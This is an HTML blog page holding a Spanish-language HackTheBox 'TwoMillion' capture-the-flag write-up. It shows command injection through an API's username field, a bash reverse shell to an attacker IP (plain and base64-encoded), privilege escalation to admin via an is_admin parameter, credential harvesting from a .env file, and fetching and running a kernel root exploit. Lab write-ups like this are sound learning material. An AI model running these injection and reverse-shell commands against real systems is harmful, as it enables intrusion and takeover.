@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TwoMillion Writeup</title>
+  <link rel="shortcut icon" href="/assets/images/logo.ico" type="image/x-icon">
+  
+  <link rel="stylesheet" href="/assets/css/style.css">
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+</head>
+
+<body>
+
+  <main>
+    
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="/assets/images/my-avatar.png" alt="Oliver Inoa" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Oliver Inoa">Oliver Inoa</h1>
+          <p class="title">Red Team Learner | Cybersecurity Student</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Contacts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <ul class="contacts-list">
+	  <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="mail-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Email</p>
+
+              <a href="#" class="contact-link" id="phone-request-link">Email available upon request.</a>
+            </div>
+
+          </li>
+
+	<li class="contact-item">
+
+            <div class="icon-box">
+              <ion-icon name="phone-portrait-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Phone</p>
+
+              <a href="#" class="contact-link" id="phone-request-link">Phone available upon request.</a>
+            </div>
+
+          </li>
+ <li class="contact-item">
+
+            <div class="icon-box">
+              <ion-icon name="calendar-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Birthday</p>
+
+              <time datetime="2001-01-17">January, 2001</time>
+            </div>
+
+          </li>
+             <li class="contact-item">
+                <div class="icon-box"><ion-icon name="location-outline"></ion-icon></div>
+                <div class="contact-info">
+                    <p class="contact-title">Location</p>
+                    <address>Mao, Valverde, Dominican Republic</address>
+                </div>
+             </li>
+        </ul>
+        <div class="separator"></div>
+        <ul class="social-list">
+          <li class="social-item"> <a href="https://www.linkedin.com/in/oliverinoa/" class="social-link" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a> </li>
+          <li class="social-item"> <a href="https://x.com/Olivalein" class="social-link" target="_blank" rel="noopener noreferrer"> <i class="fab fa-x-twitter"></i> </a> </li>
+          <li class="social-item"> <a href="https://www.instagram.com/oliver_1701/" class="social-link" target="_blank" rel="noopener noreferrer"> <ion-icon name="logo-instagram"></ion-icon> </a> </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      
+<nav class="navbar">
+  <ul class="navbar-list">
+
+    <li class="navbar-item">
+      <a href="/#about" class="navbar-link">About</a>
+    </li>
+
+    <li class="navbar-item">
+      <a href="/#resume" class="navbar-link">Resume</a>
+    </li>
+
+    <li class="navbar-item">
+      <a href="/#portfolio" class="navbar-link">Portfolio</a>
+    </li>
+
+    <li class="navbar-item">
+      <a href="/#blog" class="navbar-link active">Blog</a>
+    </li>
+
+    <li class="navbar-item">
+      <a href="/#certifications" class="navbar-link">Certifications</a>
+    </li>
+
+    <li class="navbar-item">
+      <a href="/#contact" class="navbar-link">Contact</a>
+    </li>
+
+  </ul>
+</nav>
+      <article class="chirpy-post active" data-page="blog-single">
+  
+  <header class="post-header">
+    <h1 class="h2 article-title">TwoMillion Writeup</h1>
+    <div class="post-meta">
+      <span class="post-date">
+        <i class="far fa-calendar"></i> Sep 28, 2025
+      </span>
+      
+      <span class="post-categories">
+        <i class="far fa-folder"></i> HackTheBox, Linux
+      </span>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <p>Lo primero que hicimos fué un escaneo con nmap <img src="/assets/images/writeups/1.png" alt="" /></p>
+
+<blockquote>
+  <p>Como se puede observar en la imagen, nos arrojó el dominio de la página, 2million.htb, por ende enviamos la ip de la máquina al hosts &gt; <code class="language-plaintext highlighter-rouge">echo "10.10.11.221 - 2million.htb | sudo tee -a /etc/hosts</code> Esto nos permite entrar a la página desde el navegador sin necesidad de poner directamente la ip.</p>
+</blockquote>
+
+<p>Luego de entrar a la página, es una versión antigua de hack the box, en la cuál para poder logearnos, tenemos que “hackear” el código de invitación
+<img src="/assets/images/writeups/{CEC42CC3-6BC1-4872-90EF-1D711CE712C3}.png" alt="" />
+Dónde la misma página nos dice que debemos hacer el challenge para logearnos.</p>
+
+<p>Luego de que estamos en la página para entrar el código de invitación, abrimos las opciones de desarrollador del navegador, y encontramos algo interesante, un archivo llamado <span style="color: 7435F0;">inviteapi.min.js</span> el cuál si abrimos, vemos un código de javascript ofuscado, el cuál podemos desofuscar con <a href="https://lelinhtinh.github.io/de4js/">de4js</a> solo tenemos que pegare código y darle a Auto decode. En seguida nos muestra el código desofuscado:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">verifyInviteCode</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">formData</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="dl">"</span><span class="s2">code</span><span class="dl">"</span><span class="p">:</span> <span class="nx">code</span>
+    <span class="p">};</span>
+    <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
+        <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">dataType</span><span class="p">:</span> <span class="dl">"</span><span class="s2">json</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">data</span><span class="p">:</span> <span class="nx">formData</span><span class="p">,</span>
+        <span class="na">url</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/api/v1/invite/verify</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">success</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+        <span class="p">},</span>
+        <span class="na">error</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nf">makeInviteCode</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
+        <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">dataType</span><span class="p">:</span> <span class="dl">"</span><span class="s2">json</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">url</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/api/v1/invite/how/to/generate</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">success</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+        <span class="p">},</span>
+        <span class="na">error</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>En el cuál la primera función es para verificar el código de invitación, mientras que la segunda es para generar el código de invitación, vemos la url <code class="language-plaintext highlighter-rouge">/api/v1/invite/how/to/generate</code> y hacemos una petición POST con <code class="language-plaintext highlighter-rouge">curl -X POST http://2million.htb/api/v1/how/to/generate</code>  y nos genera un código cesar:
+<img src="/assets/images/writeups/Pasted image 20250928103619.png" alt="" />
+Este lo pasamos por la página <a href="https://rot13.com/">ROT13</a> Y nos indica lo siguiente : <code class="language-plaintext highlighter-rouge">In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate</code> entonces hacemos un curl nuevamente a la dirección <code class="language-plaintext highlighter-rouge">/api/v1/invite/generate</code></p>
+
+<ul>
+  <li>
+    <p>Esto nos lanza un código encriptado con base64 y lo descodificamos con <code class="language-plaintext highlighter-rouge">base64 -d</code>:
+<img src="/assets/images/writeups/Pasted image 20250928105045.png" alt="" /></p>
+  </li>
+  <li>Listo, ese es el código de invitación para poder registrarnos en la web antigua de HTB, luego de registrarnos, nos logeamos con nuestro usuario y contraseña, para luego enumerar la página.</li>
+  <li>Nos vamos al apartado Access en el menú desplegable de la izquierda, al ver esta página, tenemos una opción de “connection pack” al ver lo que hace, nos descarga un archivo VPN, y si vemos el enlace, su ruta es <code class="language-plaintext highlighter-rouge">/api/v1/vpn/generate</code>
+hacemos un <code class="language-plaintext highlighter-rouge">curl -sv -X GET 2million.htb/api/v1 --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" | js-beautify </code> con nuestra cookie que se puede conseguir en las opciones de desarrollador del navegador,
+      al hacer el curl con nuestra cookie, nos muestra la siguiente información:
+  <img src="/assets/images/writeups/Pasted image 20250928122356.png" alt="" />
+hacemos una petición al <code class="language-plaintext highlighter-rouge">/api/v1/admin/auth</code> con <code class="language-plaintext highlighter-rouge">curl 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" | js-beautify </code> y esto nos muestra el mensaje en pantalla: <code class="language-plaintext highlighter-rouge">"message": false</code> el cuál nos está indicando que no somos administradores, luego al intentar con <code class="language-plaintext highlighter-rouge">curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p"</code> nos indica: <code class="language-plaintext highlighter-rouge">{"status":"danger","message":"Invalid content type."}</code> y no nos muestra un error de unathorized como antes, como ya sabemos, las API usan JSON para enviar y recibir datos, por lo que intentamos con el heade <code class="language-plaintext highlighter-rouge">--header "Content-Type: application/json"</code> , al hacer el curl con el header, nos da un error, pero no cualquier error. Está indicando que nos hace falta un parámetro: <code class="language-plaintext highlighter-rouge">{"status":"danger","message":"Missing parameter: email"}</code> el parámetro email, por lo que le enviaremos ese parámetro con <code class="language-plaintext highlighter-rouge">--data '{"email":"test@test.com"}'</code> siendo el <code class="language-plaintext highlighter-rouge">test@test.com</code> el email con el que nos registramos.</li>
+</ul>
+
+<p>luego de aplicar el comando completo, ahora nos hace una pregunta, por decirlo de alguna forma; <code class="language-plaintext highlighter-rouge">"status":"danger","message":"Missing parameter: is_admin"</code> por lo que le pondremos el parámetro afirmando que si es admin, de la siguiente forma: <code class="language-plaintext highlighter-rouge">'{"email":"test@test.com","is_admin":'true'}'</code> al hacer esto, la web nos devuelve <code class="language-plaintext highlighter-rouge">{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}</code> entonces cambiamos la data que le estamos entrando por: <code class="language-plaintext highlighter-rouge">'{"email":"test@test.com","is_admin":'1'}'</code> el cuál nos devuelve con: <code class="language-plaintext highlighter-rouge">{"id":16,"username":"test","is_admin":1}</code> es decir, nos está indicando que somos admin.</p>
+
+<p>para confirmar que somos admin, ejecutamos nuevamente el comando <code class="language-plaintext highlighter-rouge">curl 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" | js-beautify </code> para ver que nos dice el mensaje, el cuál nos indicó la siguiente respuesta: <code class="language-plaintext highlighter-rouge">{"message":true}</code> por ende, ya somos admin en el user test.</p>
+
+<p>luego de esto, intentamos en el apartado <code class="language-plaintext highlighter-rouge">/api/v1/vpn/generate</code> a ver que nos dice, siempre aplicando el header JSON: <code class="language-plaintext highlighter-rouge">curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" --header "Content-Type: application/json"</code> a lo que nos responde con: <code class="language-plaintext highlighter-rouge">{"status":"danger","message":"Missing parameter: username"}</code>, es decir, nos falta poner el username, simpmente poniendo:</p>
+
+<p><code class="language-plaintext highlighter-rouge">curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" --header "Content-Type: application/json" --data '{"username":"test"}'</code></p>
+
+<p>el cuál nos da una respuesta con los datos de la VPN , si esta VPN está siendo generada mediante PHP, podemos inyectar comandos maliciosos, para que nos devuelva con una cli, lo cual intentamos con: 
+<code class="language-plaintext highlighter-rouge">curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=vd3g6rs781lepia2nkpc05a27p" --header "Content-Type: application/json" --data '{"username":"test;id;"}'</code></p>
+
+<p><img src="/assets/images/writeups/Pasted image 20250928130503.png" alt="" /></p>
+
+<ul>
+  <li>El cuál nos respondió correctamente al inyección. Luego de esto nos ponemos en escucha con netcat <code class="language-plaintext highlighter-rouge">nc -nlvp 9001</code> para obtener una shell:</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-sv</span> <span class="nt">-X</span> POST 2million.htb/api/v1/admin/vpn/generate <span class="nt">--cookie</span> <span class="s2">"PHPSESSID=vd3g6rs781lepia2nkpc05a27p"</span> <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="s1">'{"username":"test;bash -i &gt;&amp; /dev/tcp/10.10.14.183/9001 0&gt;&amp;1 | bash;"}'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Al intentarlo de esa forma, no nos da la shell, por lo que intentamos codificando la inyección :
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST 2million.htb/api/v1/admin/vpn/generate <span class="nt">--cookie</span> <span class="s2">"PHPSESSID=vd3g6rs781lepia2nkpc05a27p"</span> <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="s1">'{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODMvOTAwMSAwPiYxCg== | base64 -d | bash;"}'</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Y listo, tenemos una shell, navegando dentro de la máquina, podemos ver un usuario y contraseña, del user admin en la ruta <code class="language-plaintext highlighter-rouge">/var/www/html/.env</code></li>
+  <li>
+    <p>Nos logeamos mediante ssh <code class="language-plaintext highlighter-rouge">ssh admin@10.10.11.221</code> y ponemos la contraseña. Luego de entrar, cateamos la user.txt y obtenemos la flag user.</p>
+
+    <p>Procedemos a limpiar nuestra terminal, lo podemos hacer poniendo el comando <code class="language-plaintext highlighter-rouge">export TERM=xterm</code> para poder hacer un ctrl+L, luego navengando hasta la ruta <code class="language-plaintext highlighter-rouge">/var/mail</code> nos encontramos con un archivo llamado admin, lo cateamos y nos muestro lo siguiente:</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+From: ch4p &lt;ch4p@2million.htb&gt;
+To: admin &lt;admin@2million.htb&gt;
+Cc: g0blin &lt;g0blin@2million.htb&gt;
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 <span class="nt">-0700</span>
+Message-ID: &lt;9876543210@2million.htb&gt;
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I<span class="s1">'m know you'</span>re working as fast as you can to <span class="k">do </span>the DB migration. While we<span class="s1">'re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can'</span>t get popped by that.
+</code></pre></div></div>
+
+<p>el cuál nos da una idea de qué buscar… Buscando en google <code class="language-plaintext highlighter-rouge">OverlayFS / FUSE exploit</code> encontramos un repositorio en github con el <a href="https://github.com/puckiestyle/CVE-2023-0386">CVE-2023-0386</a>  El cuál tiene un script hecho en C para convertirnos en root, mediante el SUID, este lo clonamos en nuestra máquina atacante haciendo un <code class="language-plaintext highlighter-rouge">git clone https://github.com/puckiestyle/CVE-2023-0386</code>, lo comprimimos con <code class="language-plaintext highlighter-rouge">zip -r cve.zip CVE-2023-0386</code> y en el mismo directorios que estamos, lanzamos un servidor simple con pyhthon <code class="language-plaintext highlighter-rouge">python3 http.server 8000</code> luego en la máquina vícitma ponemos el comando <code class="language-plaintext highlighter-rouge">wget http://10.10.14.183/cve.zip</code> y obtenemos el archivo, se descomprime, y luego de descomprimirlo entramos a la carpeta.</p>
+
+<p>hacemos un <code class="language-plaintext highlighter-rouge">make all</code> y luego un <code class="language-plaintext highlighter-rouge">./fuse ./ovlcap/lower ./gc</code> para compilar el programa, ya que está hecho en lenguaje C, y por ende tenemos que compilarlo antes de ejecutarlo. Por último hacemos <code class="language-plaintext highlighter-rouge">./exp</code> y listo, ya samos root, la flag se encuentra en el directorio root.</p>
+
+<p>Esto sería todo por esta máquina, esta máquina me ayudó bastante a saber enumerar, aprendí muchos conceptos que desconocía. Gracias por leer hasta aquí :)</p>
+
+
+  </div>
+
+</article>
+
+
+    </div>
+
+  </main>
+
+  <script src="/assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  // Busca todos los blockquotes
+  const blockquotes = document.querySelectorAll('blockquote');
+
+  blockquotes.forEach(bq => {
+    // Busca si el primer párrafo empieza con [!
+    const firstP = bq.querySelector('p');
+    if (!firstP) return;
+
+    const content = firstP.textContent;
+    const match = content.match(/^\[!(\w+)\]/);
+
+    if (match) {
+      // Es un callout de Obsidian!
+      const type = match[1].toLowerCase();
+      
+      // Crear el contenedor nuevo
+      const wrapper = document.createElement('div');
+      wrapper.className = 'callout';
+      wrapper.setAttribute('data-type', type);
+
+      // Crear el título
+      const title = document.createElement('div');
+      title.className = 'callout-title';
+      // Capitalizar primera letra
+      title.innerText = type.charAt(0).toUpperCase() + type.slice(1);
+      
+      // Limpiar el texto original "[!note]" del primer párrafo
+      firstP.innerHTML = firstP.innerHTML.replace(/^\[!(\w+)\]\s*/, '');
+
+      // Armar la nueva estructura
+      wrapper.appendChild(title);
+      
+      // Mover todo el contenido del blockquote al nuevo div
+      while (bq.firstChild) {
+        wrapper.appendChild(bq.firstChild);
+      }
+
+      // Reemplazar el blockquote original por nuestro div chulo
+      bq.parentNode.replaceChild(wrapper, bq);
+    }
+  });
+});
+</script>
+
+</body>
+</html>
